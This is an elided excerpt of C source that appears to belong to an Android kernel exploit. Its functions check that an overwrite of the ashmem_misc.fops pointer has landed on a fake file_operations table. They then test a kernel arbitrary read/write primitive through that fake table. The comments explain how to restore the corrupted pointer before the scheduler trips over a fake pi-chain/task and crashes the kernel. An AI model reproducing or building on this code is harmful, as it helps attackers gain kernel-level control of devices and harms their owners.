...
/* Minimal landing check: a single fops readback + compare, no AAR/AAW writes.
 * Split out of oss_verify_kernel_access_ex so the post-trigger flow can prove
 * the corruption landed and then restore ashmem_misc.fops IMMEDIATELY, before
 * spending any extra AAR/AAW round trips. That latency is what let the
 * scheduler walk the fake pi-chain/task and fault async (swapper Oops) before
 * the global fops pointer was neutralized. */
int oss_verify_fops_landed(int fd, uint64_t ashmem_misc_fops_addr,
                           uint64_t expected_fops_addr, int *landed) {
  ...
  fprintf(stderr,
          ...
          (unsigned long long)expected_fops_addr);
  if (got != expected_fops_addr) {
    char stage[96];
...
/* Full R/W round trip through the fd's retained fake f_op. Safe to call AFTER
 * ashmem_misc.fops is restored: the already-open fd keeps the fake f_op. */
int oss_verify_magic_rw(int fd, uint64_t page_base) {
...
int oss_verify_kernel_access_ex(int fd, uint64_t ashmem_misc_fops_addr,
                                uint64_t expected_fops_addr,
                                uint64_t page_base, int *landed) {
  return oss_verify_fops_landed(fd, ashmem_misc_fops_addr,
                                expected_fops_addr, landed) &&
         oss_verify_magic_rw(fd, page_base);
}

int oss_verify_kernel_access(int fd, uint64_t ashmem_misc_fops_addr,
                             uint64_t page_base) {
  return oss_verify_kernel_access_ex(fd, ashmem_misc_fops_addr,
                                     page_base | 0x1180ULL, page_base, NULL);
}
